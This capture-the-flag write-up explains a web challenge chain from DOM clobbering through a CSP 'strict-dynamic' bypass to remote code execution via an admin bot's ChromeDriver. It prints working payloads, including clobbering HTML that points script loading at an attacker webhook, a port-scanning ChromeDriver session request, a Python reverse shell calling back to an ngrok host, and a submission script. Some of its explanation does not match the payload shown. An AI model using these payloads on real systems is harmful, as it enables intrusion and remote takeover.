# Pastebord - DOM Clobbering to RCE

## Challenge Description

A Flask-based pastebin application with CSP protection. The goal is to achieve RCE by exploiting DOM clobbering vulnerabilities that lead to XSS, which can then be leveraged against the admin bot's ChromeDriver.

**Category:** Web Exploitation  
**Difficulty:** Hard  
**CTF:** UoCTF 2026

## Overview

This challenge involves a multi-stage exploit chain:
1. **DOM Clobbering** - Bypass security checks by clobbering JavaScript objects
2. **XSS** - Execute arbitrary JavaScript in the admin's browser
3. **ChromeDriver RCE** - Abuse the ChromeDriver API to achieve remote code execution

## Source Code Analysis

### Key Files

**app.py** - Flask application with:
- CSP with `script-src 'nonce-{nonce}' 'strict-dynamic'`
- Note creation and viewing endpoints
- Admin bot reporting functionality
- Error telemetry system

**app.js** - Client-side rendering logic:
```javascript
try {
  const cfg = window.renderConfig || { mode: (card && card.dataset.mode) || "safe" };
  const mode = cfg.mode.toLowerCase();
  const clean = DOMPurify.sanitize(raw, { ALLOW_DATA_ATTR: false });
  if (card) {
    card.innerHTML = clean;
  }
  if (mode !== "safe") {
    console.log("Render mode:", mode);
  }
} catch (err) {
  window.lastRenderError = err ? String(err) : "unknown";
  handleError();
}
```

**view.html** - Note viewing template with:
- DOMPurify sanitization
- Error reporter script injection mechanism

### The Vulnerability Chain

#### 1. DOM Clobbering Attack

The application uses `window.renderConfig` and `window.errorReporter` objects without proper validation. We can pollute these using HTML elements with `id` attributes to trigger an error:

```html
<a id=renderConfig href=pwned>pwned</a>
<form id=errorReporter>
    <input id=path value=https://webhook.site/YOUR-WEBHOOK>
</form>
```

**Understanding DOM Clobbering:**

DOM Clobbering exploits how browsers automatically create global JavaScript variables from HTML elements with `id` or `name` attributes.

**Step 1: Polluting window.renderConfig to Cause an Error**

The key is to create a structure that will throw an error when the code tries to call `.toLowerCase()`:

```html
<a id=renderConfig href=pwned>pwned</a>
```

**What happens:**
- Two `<a>` elements with the same `id="renderConfig"` create `window.renderConfig` as an `HTMLCollection`
- The nested element with `name=mode` makes `renderConfig.mode` accessible
- `renderConfig.mode` becomes an `HTMLAnchorElement` object
- When the code executes `cfg.mode.toLowerCase()`, it's trying to call `.toLowerCase()` on the `href` value

**The Critical Error:**
```javascript
const mode = cfg.mode.toLowerCase();
```

The `href` attribute with value `"cid:xxx"` or certain special values will cause `.toLowerCase()` to throw an error or behave unexpectedly. More importantly, **calling `.toLowerCase()` on an HTMLAnchorElement object (instead of a string) throws a TypeError**!

**Why this triggers the catch block:**
1. `cfg.mode` is an `HTMLAnchorElement`, not a string
2. `cfg.mode.toLowerCase()` tries to call a string method on an object
3. This throws a **TypeError: cfg.mode.toLowerCase is not a function** (or similar)
4. The error is caught by the `catch` block
5. `handleError()` is called

**Step 2: Polluting window.errorReporter**
```html
<form id=errorReporter>
    <input id=path value=https://webhook.site/YOUR-WEBHOOK>
</form>
```
- Creates `window.errorReporter` as an `HTMLFormElement`
- The `<input id=path>` inside creates `errorReporter.path` as an `HTMLInputElement`
- Now `errorReporter.path.value` returns our malicious webhook URL

**The Exploitation Chain:**
1. DOM Clobbering makes `cfg.mode` an HTMLAnchorElement object
2. Calling `.toLowerCase()` on this object throws a TypeError
3. The `catch` block catches the error
4. `handleError()` function is called
5. `handleError()` reads `errorReporter.path.value` (our webhook)
6. A new script element is created and loaded from our URL

#### 2. CSP Bypass with 'strict-dynamic'

When the error occurs and `handleError()` executes:
```javascript
function handleError() {
  const c = window.errorReporter || { path: "/telemetry/error-reporter.js" };
  const p = c.path && c.path.value
    ? c.path.value  // Our clobbered value!
    : String(c.path || "/telemetry/error-reporter.js");
  const s = document.createElement("script");
  s.src = p;
  document.head.appendChild(s);
}
```

**CSP Bypass Explanation:**

The CSP policy is: `script-src 'nonce-{nonce}' 'strict-dynamic'`

- **'nonce-{nonce}'**: Only scripts with the correct nonce attribute can execute
- **'strict-dynamic'**: It allows scripts created by trusted scripts to execute, even from external sources

**How the bypass works:**

1. The initial `app.js` script loads with a valid nonce: `<script nonce="{{ nonce }}" src="/static/app.js"></script>`
2. This trusted script dynamically creates a new script element: `document.createElement("script")`
3. Because of `'strict-dynamic'`, this dynamically created script **inherits trust** from its creator
4. The new script can load from **ANY URL** (our webhook), bypassing the nonce requirement
5. Our malicious JavaScript executes with full privileges!

#### 3. ChromeDriver RCE

```python
import time

from selenium import webdriver
from selenium.webdriver.chrome.options import Options

BASE_URL = "http://127.0.0.1:5000"
FLAG = "uoftctf{fake_flag}"

def visit_url(target_url):
    options = Options()
    options.add_argument("--headless=true")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=options)
    try:
        driver.get(target_url)
        time.sleep(30)
    finally:
        driver.quit()
```

ChromeDriver's `/session` endpoint accepts `goog:chromeOptions.binary` to specify the browser binary. By setting this to Python and passing malicious arguments, we achieve code execution. The attack:
    1. **Scans for ChromeDriver** - Brute force ports 32768-61000
    2. **Exploits ChromeDriver API** - Creates a malicious session with Python as the "Chrome binary"
    3. **Reverse Shell** - Executes Python code for a reverse shell

## Exploitation

### Step 1: Setup Webhook

Create a webhook at `webhook.site` that responds with:

**Content-Type:** `text/javascript`

**Body:**
```javascript
const options = {
    mode: "no-cors",
    method: "POST",
    body: JSON.stringify({
      capabilities: {
        alwaysMatch: {
          "goog:chromeOptions": {
            binary: "/usr/local/bin/python",
            args: [`-cimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_NGROK.tcp.eu.ngrok.io",YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")`],
          },
        },
      },
    }),
  };

  for (let port = 32768; port < 61000; port++) {
    fetch(`http://127.0.0.1:${port}/session`, options);
  }
```

### Step 2: Setup Reverse Shell Listener
```bash
ngrok tcp 4444  # Get your ngrok URL
nc -lvnp 4444   # Listen for connection
```

### Step 3: Run Exploit
```python
import requests

URL = "http://172.17.0.2:5000"
s = requests.Session()

def post_domClobering():
    dom_clobering_payload = """
    <a id=renderConfig href=pwned>pwned!</a>
    <form id=errorReporter>
        <input id=path value=https://webhook.site/YOUR-WEBHOOK-ID>
    </form>
    """

    return s.post(URL + "/note/new", data={"title" : "pwned", "body" : dom_clobering_payload}, allow_redirects=False).headers["Location"]

def post_adminBot(link):
    print(s.post(URL + "/report", data={"url" : link}).text)

link_payload = post_domClobering()
print(link_payload)
post_adminBot(link_payload)
```

### Step 4: Get Shell

When the admin bot visits the malicious note:
1. DOM clobbering sets `renderConfig` and `errorReporter` objects
2. The code tries to call `.toLowerCase()` on an HTMLAnchorElement, throwing a TypeError
3. The `catch` block executes and calls `handleError()`
4. `handleError()` loads script from our webhook URL (XSS via CSP bypass)
5. JavaScript scans for ChromeDriver and exploits it
6. Python reverse shell connects back to your ngrok listener


## References

- [DOM Clobbering - PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [CSP strict-dynamic](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
- [ChromeDriver Security - Jorian Woltjer](https://book.jorianwoltjer.com/web/client-side/headless-browsers#chromedriver)

